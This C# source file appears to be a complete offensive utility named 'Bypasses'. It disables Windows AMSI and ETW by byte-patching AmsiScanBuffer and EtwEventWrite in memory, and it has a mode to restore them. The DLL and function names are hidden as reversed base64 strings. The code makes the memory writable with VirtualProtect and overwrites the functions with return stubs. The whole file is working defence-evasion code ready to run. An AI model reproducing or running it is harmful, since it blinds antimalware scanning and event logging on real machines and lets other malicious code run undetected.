using System;
using System.Linq;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;


namespace Bypasses
{
    public class Program
    {
        [DllImport("kernel32")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        private static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private static byte[] OGAmsiBytes = null;
        private static byte[] OGEtwBytes = null;

        private static void Copy(byte[] fix, IntPtr addr, int holderFoo = 0)
        {
            uint rw = 0x04;
            uint old = 0;
            VirtualProtect(addr, (UIntPtr)fix.Length, rw, out old);
            Marshal.Copy(fix, holderFoo, addr, fix.Length);
            VirtualProtect(addr, (UIntPtr)fix.Length, old, out rw);
        }
        private static byte[] Read(IntPtr somePlaceInMem, int length = 0)
        {
            List<byte> bytes = new List<byte>();
            for (int i = 0; i < length; i++)
            {
                bytes.Add(Marshal.ReadByte(somePlaceInMem, i));
            }
            return bytes.ToArray();
        }

        private static int Etw(string[] args)
        {
            if(args.Length == 0 || args[0] != "patch" && args[0] != "unpatch")
            {
                Console.WriteLine("Usage: bypass etw [patch|unpatch]");
                return 0;
            }

            byte[] fix = { };
            if (args[0] == "patch")
            {
                if (IntPtr.Size == 8) // 64-bit process
                {
                    // x64 bypass bytes, reversed
                    fix = new byte[] { 0x00, 0xC3 };
                }
                else
                {
                    // x86 bypass bytes, reversed
                    fix = new byte[] { 0x00, 0x14, 0xC2 };
                }
                Array.Reverse(fix);
            }
            else if (args[0] == "unpatch")
            {
                if (OGEtwBytes != null)
                {
                    fix = OGEtwBytes;
                }
                else
                {
                    Console.WriteLine($"[!] Etw has not been patched yet! Cannot unpatch!");
                    return 0;
                }
            }

            // patch ETW
            try
            {
                // ntdll.dll
                var fooBar = LoadLibrary(new string(Encoding.UTF8.GetString(Convert.FromBase64String("bGxkLmxsZHRu")).ToCharArray().Reverse().ToArray()));
                // EtwEventWrite
                var addr = GetProcAddress(fooBar, new string(Encoding.UTF8.GetString(Convert.FromBase64String("ZXRpcld0bmV2RXd0RQ==")).ToCharArray().Reverse().ToArray()));

                byte[] beforeBytes = Read(addr, fix.Length);

                // Fetch original ETW bytes and save for future unpatching
                if (OGEtwBytes == null)
                {
                    OGEtwBytes = beforeBytes;
                }

                if (beforeBytes.AsQueryable().SequenceEqual<byte>(fix))
                {
                    Console.WriteLine($"[*] Etw already {args[0]}ed. Nothing to do!");
                    return 0;
                }
                else
                {
                    Copy(fix, addr);
                }

                if (!fix.AsQueryable().SequenceEqual<byte>(Read(addr, fix.Length)))
                {
                    throw new Exception($"[!] {args[0]}ing failed: Etw memory is not equal to patch bytes!");
                }
                Console.WriteLine($"[+] {args[0]}ed Etw successfully");
            }
            catch (Exception ex)
            {
                Console.WriteLine("{0}", ex.Message);
            }
            return 0;
        }
        private static int Amsi(string[] args)
        {
            if(args.Length == 0 || args[0] != "patch" && args[0] != "unpatch")
            {
                Console.WriteLine("Usage: bypass amsi [patch|unpatch]");
                return 0;
            }

            byte[] fix = { };
            if (args[0] == "patch")
            {
                if (IntPtr.Size == 8) // 64-bit process
                {
                    // x64 bypass bytes, reversed
                    fix = new byte[] { 0xC3, 0x80, 0x07, 0x00, 0x57, 0xB8 };
                }
                else
                {
                    // x86 bypass bytes, reversed
                    fix = new byte[] { 0x00, 0x18, 0xC2, 0x80, 0x07, 0x00, 0x57, 0xB8 };
                }
                Array.Reverse(fix);
            }
            else if (args[0] == "unpatch")
            {
                if(OGAmsiBytes != null)
                {
                    fix = OGAmsiBytes;
                }
                else
                {
                    Console.WriteLine("[!] Amsi has not been patched yet! Cannot unpatch!");
                    return 0;
                }
            }

            // Patch AMSI
            try
            {
                // amsi.dll
                var fooBar = LoadLibrary(new string(Encoding.UTF8.GetString(Convert.FromBase64String("bGxkLmlzbWE=")).ToCharArray().Reverse().ToArray()));
                // AmsiScanBuffer
                IntPtr addr = GetProcAddress(fooBar, new string(Encoding.UTF8.GetString(Convert.FromBase64String("cmVmZnVCbmFjU2lzbUE=")).ToCharArray().Reverse().ToArray()));

                byte[] beforeBytes = Read(addr, fix.Length);

                // Fetch original AMSI bytes and save for future unpatching
                if (OGAmsiBytes == null)
                {
                    OGAmsiBytes = beforeBytes;
                }

                if (beforeBytes.AsQueryable().SequenceEqual<byte>(fix))
                {
                    Console.WriteLine($"[*] Amsi already {args[0]}ed. Nothing to do!");
                    return 0;
                }
                else
                {
                    Copy(fix, addr);
                }

                if (!fix.AsQueryable().SequenceEqual<byte>(Read(addr, fix.Length)))
                {
                    throw new Exception($"[!] {args[0]}ing failed: Amsi memory is not equal to patch bytes!");
                }
                Console.WriteLine($"[+] {args[0]}ed Amsi successfully");
            }
            catch (Exception ex)
            {
                Console.WriteLine("{0}", ex.Message);
            }
            return 0;
        }
        public static int Main(string[] args)
        {
            if (args.Length == 0 || args[0] == "-h" || args[0] == "/?" || args[0] == "/h" || args[0] == "--help" || args[0] == "-help")
            {
                Console.WriteLine("Bypasses - Neuter Amsi or Etw using vanilla byte patching");
                Console.WriteLine("Usage: Bypasses <amsi|etw> <patch|unpatch>");
                return 0;
            }
            string cmd = args[0].ToLower();
            args = args.Skip(1).Take(args.Length).ToArray(); // cut off the first element in the args[] array
            if(cmd == "amsi")
            {
                return Amsi(args);
            }
            else if(cmd == "etw")
            {
                return Etw(args);
            }
            // TODO: Unhook (at least NTDLL)
            else
            {
                Console.WriteLine("[!] Invalid sub-command selection: " + cmd);
                return 0;
            }
        }
    }
}

